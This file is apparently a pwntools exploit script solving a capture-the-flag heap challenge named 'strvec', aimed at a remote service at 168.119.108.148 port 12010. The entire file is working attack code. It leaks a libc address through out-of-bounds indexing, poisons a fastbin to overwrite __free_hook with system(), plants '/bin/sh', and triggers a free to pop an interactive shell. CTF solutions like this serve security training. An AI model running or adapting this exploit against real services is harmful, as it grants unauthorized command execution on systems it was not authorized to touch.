from pwn import *
import sys

if sys.argv[1] == "r":
    p = remote("168.119.108.148", 12010)
else:
    p = process("./strvec_patched", env={"LD_PRELOAD":"libc.so.6"})
    context.terminal = ["tmux", "splitw", "-h"]
    gdb.attach(p, """ 
                     continue
                 """)

libc = ELF("libc.so.6")
def get(index):
    p.sendlineafter("> ", "1")
    p.sendlineafter("idx = ", str(index))

def set(index, data):
    p.sendlineafter("> ", "2")
    p.sendlineafter("idx = ", str(index))
    p.sendafter("data = ", data)

def solve():
    p.sendlineafter("Name: ", "")
    p.sendlineafter("n = ", str(0x20097969))        # malloc big chunk to map new memory region 
    
    # leak libc
    get((0xd516d+17))
    libc.address = u64(p.recvline()[16:16+6] + "\x00\x00") - 0x1ebbe0
    success("libc: %s"%hex(libc.address)) 
    malloc_hook = libc.symbols["__malloc_hook"]
    free_hook = libc.symbols["__free_hook"]
    system = libc.symbols["system"]
    success("system: %s"%hex(system))
    success("free_hook: %s"%hex(free_hook))
    success("malloc_hook: %s"%hex(malloc_hook))

    # leak heap base
    # get(0xd517b)
    # heap_base = u64(p.recvline()[16:16+6] + "\x00\x00") - 0x280
    # success("heap base: %s"%hex(heap_base))
    
    # play with fastbin in main arenas
    set(0xd5170, "A"*8 + p64(0x31) + p64(free_hook-0x10) + "\n")
    set(2, "/bin/sh\x00\n")
    set(3, p64(system) + "\n")

    # pop shell
    p.sendlineafter("> ", "4")
    p.interactive()

if __name__ == "__main__":
    solve()
